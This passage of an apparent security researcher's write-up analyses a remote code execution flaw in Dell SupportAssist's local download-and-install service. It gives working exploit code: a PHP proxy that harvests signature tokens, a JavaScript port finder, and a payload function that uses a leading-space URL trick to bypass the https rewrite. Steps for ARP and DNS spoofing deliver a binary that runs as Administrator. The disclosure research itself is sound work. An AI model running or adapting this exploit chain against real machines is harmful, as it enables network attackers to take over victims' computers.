localclient_img - Connects to SignalR (Dell Hardware Support).
diagnosticsservice_getsysteminfowithappcrashinfo - Grabs system information with crash dump information.
clientservice_getclientsysteminfo - Grabs information about devices on system and system health information optionally.
diagnosticsservice_startdiagnosisflow - Used to diagnose issues on system.
downloadservice_downloadmanualinstall - Downloads a list of files but does not execute them.
diagnosticsservice_getalertsandnotifications - Gets any alerts and notifications that are pending.
diagnosticsservice_launchtool - Launches a diagnostic tool.
diagnosticsservice_executesoftwarefixes - Runs remediation UI and executes a certain action.
downloadservice_createiso - Download an ISO.
clientservice_checkadminrights - Check if the Agent privileged.
diagnosticsservice_performinstallation - Update SupportAssist.
diagnosticsservice_rebootsystem - Reboot system.
clientservice_getdevices - Grab system devices.
downloadservice_dlmcommand - Check on the status of or cancel an ongoing download.
diagnosticsservice_getsysteminfo - Call GetSystemInfo on PC Doctor (Dell Hardware Support).
downloadservice_installmanual - Install a file previously downloaded using downloadservice_downloadmanualinstall.
downloadservice_createbootableiso - Download bootable iso.
diagnosticsservice_isalive - Heartbeat check.
downloadservice_downloadandautoinstall - Downloads a list of files and executes them.
clientservice_getscanresults - Gets driver scan results.
downloadservice_restartsystem - Restarts the system.
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;The one that caught my interest was &lt;code class=&quot;highlighter-rouge&quot;&gt;downloadservice_downloadandautoinstall&lt;/code&gt;. This method would download a file from a specified URL and then run it. This method is ran by the browser when the user needs to install certain drivers that need to be installed automatically.&lt;/p&gt;
&lt;ol readability=&quot;-1.5&quot;&gt;&lt;li&gt;After finding which drivers need updating, the browser makes a POST request to “http://127.0.0.1:[SERVICE PORT]/downloadservice/downloadandautoinstall?expires=[EXPIRES]&amp;amp;signature=[SIGNATURE]”.&lt;/li&gt;
&lt;li&gt;The browser sends a request with the following JSON structure:
&lt;div class=&quot;language-json highlighter-rouge&quot; readability=&quot;15&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;25&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;title&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;DOWNLOAD TITLE&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;category&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;CATEGORY&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;FILENAME&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;location&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;FILE URL&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;isSecure&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;fileUniqueId&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;RANDOMUUID&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;run&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;installOrder&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;restricted&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;fileStatus&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;-99&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;driverId&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;DRIVER ID&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;dupInstallReturnCode&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;cssClass&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;inactive-step&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;isReboot&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;scanPNPId&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;PNP ID&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;$$hashKey&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;object:210&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;After doing the basic integrity checks we discussed before, ClientServiceHandler.ProcessRequest sends the ServiceMethod and the parameters we passed to ClientServiceHandler.HandlePost.&lt;/li&gt;
&lt;li&gt;ClientServiceHandler.HandlePost first puts all parameters into a nice array, then calls ServiceMethodHelper.CallServiceMethod.&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;ServiceMethodHelper.CallServiceMethod acts as a dispatch function, and calls the function given the ServiceMethod. For us, this is the “downloadandautoinstall” method:
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;7.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;10&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;if (service_Method == &quot;downloadservice_downloadandautoinstall&quot;)
{
 string files5 = (arguments != null &amp;amp;&amp;amp; arguments.Length != 0 &amp;amp;&amp;amp; arguments[0] != null) ? arguments[0].ToString() : string.Empty;
 result = DownloadServiceLogic.DownloadAndAutoInstall(files5, false);
} 
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Which calls DownloadServiceLogic.DownloadAutoInstall and provides the files we sent in the JSON payload.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;DownloadServiceLogic.DownloadAutoInstall acts as a wrapper (i.e handling exceptions) for DownloadServiceLogic._HandleJson.&lt;/li&gt;
&lt;li&gt;DownloadServiceLogic._HandleJson deserializes the JSON payload containing the list of files to download, and does the following integrity checks:
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;10.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;16&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;foreach (File file in list)
{
 bool flag2 = file.Location.ToLower().StartsWith(&quot;http://&quot;);
 if (flag2)
 {
     file.Location = file.Location.Replace(&quot;http://&quot;, &quot;https://&quot;);
 }
 bool flag3 = file != null &amp;amp;&amp;amp; !string.IsNullOrEmpty(file.Location) &amp;amp;&amp;amp; !SecurityHelper.CheckDomain(file.Location);
 if (flag3)
 {
     DSDLogger.Instance.Error(DownloadServiceLogic.Logger, &quot;InvalidFileException being thrown in _HandleJson method&quot;);
     throw new InvalidFileException();
 }
}
DownloadHandler.Instance.RegisterDownloadRequest(CreateIso, Bootable, Install, ManualInstall, list);
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;The above code loops through every file, and checks if the file URL we provided doesn’t start with http:// (if it does, replace it with https://), and checks if the URL matches a list of Dell’s download servers (not all subdomains):&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;8&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;11&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;public static bool CheckDomain(string fileLocation)
{
        List&amp;lt;string&amp;gt; list = new List&amp;lt;string&amp;gt;
        {
                &quot;ftp.dell.com&quot;,
                &quot;downloads.dell.com&quot;,
                &quot;ausgesd4f1.aus.amer.dell.com&quot;
        };
        
        return list.Contains(new Uri(fileLocation.ToLower()).Host);
} 
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;ol&gt;&lt;li&gt;Finally, if all these checks pass, the files get sent to DownloadHandler.RegisterDownloadRequest at which point the SupportAssist downloads and runs the files &lt;em&gt;as Administrator&lt;/em&gt;.&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;This is enough information we need to start writing an exploit.&lt;/p&gt;

&lt;p&gt;The first issue we face is making requests to the SupportAssist client. Assume we are in the context of a Dell subdomain, we’ll get into how exactly we do this further in this section. I decided to mimic the browser and make requests using javascript.&lt;/p&gt;
&lt;p&gt;First things first, we need to find the service port. We can do this by polling through the predefined service ports, and making a request to “/clientservice/isalive”. The issue is that we need to also provide a signature. To get the signature that we pass to isalive, we can make a request to “https://www.dell.com/support/home/us/en/04/drivers/driversbyscan/getdsdtoken”.&lt;/p&gt;
&lt;p&gt;This isn’t as straight-forwards as it might seem. The “Access-Control-Allow-Origin” of the signature url is set to “https://www.dell.com”. This is a problem, because we’re in the context of a subdomain, probably not https. How do we get past this barrier? We make the request from our own servers!&lt;/p&gt;
&lt;p&gt;The signatures that are returned from “getdsdtoken” are applicable to all machines, and not unique. I made a small PHP script that will grab the signatures:&lt;/p&gt;
&lt;div class=&quot;language-php highlighter-rouge&quot; readability=&quot;6.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;8&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Access-Control-Allow-Origin: *'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file_get_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'https://www.dell.com/support/home/us/en/04/drivers/driversbyscan/getdsdtoken'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt; 
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;The header call allows anyone to make a request to this PHP file, and we just echo the signatures, acting as a proxy to the “getdsdtoken” route. The “getdsdtoken” route returns JSON with signatures and an expire time. We can just use JSON.parse on the results to place the signatures into a javascript object.&lt;/p&gt;
&lt;p&gt;Now that we have the signature and expire time, we can start making requests. I made a small function that loops through each server port, and if we reach it, we set the server_port variable (global) to the port that responded:&lt;/p&gt;
&lt;div class=&quot;language-javascript highlighter-rouge&quot; readability=&quot;7.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;10&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;FindServer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;ports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;forEach&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;is_alive_url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://127.0.0.1:&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/clientservice/isalive/?expires=&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;signatures&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Expires&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;amp;signature=&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;signatures&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;IsaliveToken&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;SendAsyncRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;is_alive_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;server_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;});&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; 
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;After we have found the server, we can send our payload. This was the hardest part, we have some serious obstacles before “downloadandautoinstall” executes our payload.&lt;/p&gt;
&lt;p&gt;Starting with the hardest issue, the SupportAssist client has a hard whitelist on file locations. Specifically, its host &lt;strong&gt;must&lt;/strong&gt; be either “ftp.dell.com”, “downloads.dell.com”, or “ausgesd4f1.aus.amer.dell.com”. I almost gave up at this point, because I couldn’t find an open redirect vulnerability on any of the sites. Then it hit me, we can do a man-in-the-middle attack.&lt;/p&gt;
&lt;p&gt;If we could provide the SupportAssist client with a &lt;em&gt;http://&lt;/em&gt; URL, we could easily intercept and change the response! This somewhat solves the hardest challenge.&lt;/p&gt;
&lt;p&gt;The second obstacle was designed specifically to counter my solution to the first obstacle. If we look back to the steps I outlined, if the file URL starts with &lt;em&gt;http://&lt;/em&gt;, it will be replaced by &lt;em&gt;https://&lt;/em&gt;. This is an issue, because we can’t really intercept and change the contents of a proper https connection. The key bypass to this mitigation was in this sentence: “if the URL &lt;em&gt;starts with&lt;/em&gt; http://, it will be replaced by https://”. See, the thing was, if the URL string did not start with &lt;em&gt;http://&lt;/em&gt;, even if there was &lt;em&gt;http://&lt;/em&gt; somewhere else in the string, it wouldn’t replace it. Getting a URL to work was tricky, but I eventually came up with “ http://downloads.dell.com/abcdefg” (the space is intentional). When you ran the string through the starts with check, it would return false, because the string starts with “ “, thus leaving the “http://” alone.&lt;/p&gt;
&lt;p&gt;I made a function that automated sending the payload:&lt;/p&gt;
&lt;div class=&quot;language-javascript highlighter-rouge&quot; readability=&quot;16&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;27&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;SendRCEPayload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;auto_install_url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://127.0.0.1:&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;server_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/downloadservice/downloadandautoinstall?expires=&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;signatures&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Expires&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;amp;signature=&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;signatures&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DownloadAndAutoInstallToken&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;xmlhttp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;XMLHttpRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;xmlhttp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;POST&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;auto_install_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;files&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[];&lt;/span&gt;
        
        &lt;span class=&quot;nx&quot;&gt;files&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;
        &lt;span class=&quot;s2&quot;&gt;&quot;title&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;SupportAssist RCE&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s2&quot;&gt;&quot;category&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Serial ATA&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;calc.EXE&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s2&quot;&gt;&quot;location&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot; http://downloads.dell.com/calc.EXE&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// those spaces are KEY&lt;/span&gt;
        &lt;span class=&quot;s2&quot;&gt;&quot;isSecure&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s2&quot;&gt;&quot;fileUniqueId&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;guid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;
        &lt;span class=&quot;s2&quot;&gt;&quot;run&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s2&quot;&gt;&quot;installOrder&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s2&quot;&gt;&quot;restricted&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s2&quot;&gt;&quot;fileStatus&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;99&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s2&quot;&gt;&quot;driverId&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;FXGNY&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s2&quot;&gt;&quot;dupInstallReturnCode&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s2&quot;&gt;&quot;cssClass&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;inactive-step&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s2&quot;&gt;&quot;isReboot&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s2&quot;&gt;&quot;scanPNPId&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;PCI&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;VEN_8086&amp;amp;DEV_282A&amp;amp;SUBSYS_08851028&amp;amp;REV_10&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;s2&quot;&gt;&quot;$$hashKey&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;object:210&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
        
        &lt;span class=&quot;nx&quot;&gt;xmlhttp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;JSON&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stringify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;files&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt; 
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Next up was the attack from the local network. Here are the steps I take in the external portion of my proof of concept (attacker’s machine):&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;Grab the interface IP address for the specified interface.&lt;/li&gt;
&lt;li&gt;Start the mock web server and provide it with the filename of the payload we want to send. The web server checks if the Host header is &lt;code class=&quot;highlighter-rouge&quot;&gt;downloads.dell.com&lt;/code&gt; and if so sends the binary payload. If the request Host has dell.com in it and is not the downloads domain, it sends the javascript payload which we mentioned earlier.&lt;/li&gt;
&lt;li&gt;To ARP Spoof the victim, we first enable ip forwarding then send an ARP packet to the victim telling it that we’re the router and an ARP packet to the router telling it that we’re the victim machine. We repeat these packets every few seconds for the duration of our exploit. On exit, we will send the original mac addresses to the victim and router.&lt;/li&gt;
&lt;li&gt;Finally, we DNS Spoof by using iptables to redirect DNS packets to a netfilter queue. We listen to this netfilter queue and check if the requested DNS name is our target URL. If so, we send a fake DNS packet back indicating that our machine is the true IP address behind that URL.&lt;/li&gt;
&lt;li&gt;When the victim visits our subdomain (either directly via url or indirectly by an iframe), we send it the malicious javascript payload which finds the service port for the agent, grabs the signature from the php file we created earlier, then sends the RCE payload. When the RCE payload is processed by the agent, it will make a request to &lt;code class=&quot;highlighter-rouge&quot;&gt;downloads.dell.com&lt;/code&gt; which is when we return the binary payload.&lt;/li&gt;
